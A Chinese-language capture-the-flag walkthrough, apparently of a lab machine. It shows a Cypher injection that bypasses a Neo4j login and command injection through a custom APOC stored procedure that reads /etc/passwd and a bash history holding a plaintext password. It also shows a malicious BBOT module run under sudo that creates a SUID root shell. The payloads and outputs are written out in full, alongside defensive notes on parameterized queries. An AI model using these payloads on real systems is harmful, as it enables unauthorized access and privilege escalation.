立足点 Cypher 注入 → 自定义存储过程命令注入

发现 Cypher 注入

在登录页面输入用户名 admin' -- -，密码任意，触发错误信息泄露完整的 Cypher 查询：

MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' -- -' return h.value as hash

确认后端使用 Neo4j 图数据库，查询语言为 Cypher，且用户输入直接拼接到查询中。

🧒 儿童版：Cypher 是图数据库 Neo4j 的查询语言，就像 SQL 是关系数据库的查询语言一样。这里的注入原理和 SQL 注入完全一样——用户输入被直接拼到查询语句里，攻击者可以闭合引号、插入自己的查询逻辑。

Cypher 注入绕过登录

应用的认证逻辑是：用 Cypher 查询用户的 SHA1 哈希，然后与输入密码的 SHA1 对比。我们用 UNION 注入返回一个已知密码的 SHA1 值。

SHA1("a") = 86f7e437faa5a7fce15d1ddcb9eaeaea377667b8

用户名

' OR true RETURN "86f7e437faa5a7fce15d1ddcb9eaeaea377667b8" as hash LIMIT 1 UNION MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '

密码

a

拼接后的完整查询

MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' OR true
RETURN "86f7e437faa5a7fce15d1ddcb9eaeaea377667b8" as hash LIMIT 1
UNION MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = ''
return h.value as hash

第一段 OR true 匹配所有用户，返回我们控制的 SHA1 值；LIMIT 1 确保只返回一条结果；第二段 WHERE u.name = '' 返回空，不影响结果。应用将 SHA1("a") 与返回的哈希对比 → 匹配 → 登录成功。

自定义 APOC 扩展命令注入

下载 /testing/custom-apoc-extension-1.0-SNAPSHOT.jar 并反编译，发现自定义存储过程 custom.getUrlStatusCode 内部调用了 Runtime.exec()，且参数未过滤——存在命令注入。

通过 Cypher 注入调用该存储过程执行系统命令：

CALL custom.getUrlStatusCode('example.com; whoami')
{"statusCode": "000neo4j"}

命令执行成功，当前用户为 neo4j。

读取系统信息

CALL custom.getUrlStatusCode('example.com; cat /etc/passwd|grep bash| tail -2')
graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash
neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash

读取 bash 历史获取密码

CALL custom.getUrlStatusCode('example.com; cat /var/lib/neo4j/.bash_history')
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
🧒 儿童版：neo4j 用户之前在命令行里设置过数据库密码，这条命令被记录在了 bash 历史文件里。我们通过命令注入读到了这个历史记录，拿到了密码。

BBOT（Bionic Baboon Information Gathering Tool）是一款模块化信息收集工具，支持通过 YAML 配置文件加载自定义 Python 模块。

编写恶意模块

创建配置文件 /tmp/my_present.yml

modules:
- mymodule
module_dirs:
- /tmp/my_modules

创建恶意模块 /tmp/my_modules/mymodule.py

from bbot.modules.base import BaseModule
import os
os.system("cp /bin/bash /tmp/rootbash;chmod 6777 /tmp/rootbash")

class MyModule(BaseModule):
    watched_events = ["DNS_NAME"]
    async def handle_event(self, event):
        pass
🧒 儿童版：bbot 是一个安全扫描工具，它允许加载自定义的"插件模块"。管理员给了 graphasm sudo bbot 的权限，本意是让他做安全扫描。但我们写了一个假插件——里面不是扫描代码，而是"复制一个 root 权限的 bash"。bbot 以 root 身份加载这个插件时，恶意代码就被执行了。

⚠️ 踩坑提醒

Cypher 注入和 SQL 注入语法不同：Cypher 用 MATCH ... WHERE ... RETURN，不是 SELECT ... FROM ... WHERE

UNION 在 Cypher 中要求两边返回相同的列名（本例中都是 hash）

LIMIT 1 很重要——如果应用检查结果数量，返回多条会导致失败

自定义存储过程的命令注入输出会拼接在 statusCode 字段前面的 000 后面

bbot 的 --force 参数用于跳过确认提示

额外知识

Cypher 注入 vs SQL 注入

对比项SQL 注入Cypher 注入
数据库类型关系数据库（MySQL, PostgreSQL）图数据库（Neo4j）
查询语法SELECT * FROM users WHERE name = '...'MATCH (u:USER) WHERE u.name = '...' RETURN u
联合查询UNION SELECTUNION MATCH ... RETURN
注释符-- 、#、/* *///（行注释）
存储过程CALL xp_cmdshell(...)CALL custom.xxx(...)
核心原理用户输入拼接到查询语句完全相同

Cypher 注入在实战中相对少见，但随着图数据库（Neo4j、Amazon Neptune）的普及，这类漏洞正在增多。核心防御方式与 SQL 注入相同：使用参数化查询。

BBOT 安全风险

BBOT 的 module_dirs 功能允许从任意目录加载 Python 模块。当 bbot 以 sudo 运行时，加载的模块代码也以 root 权限执行。这与 sudo pip install、sudo composer run-script 等属于同类提权向量——任何允许加载/执行用户可控代码的工具，配合 sudo 都是危险的。
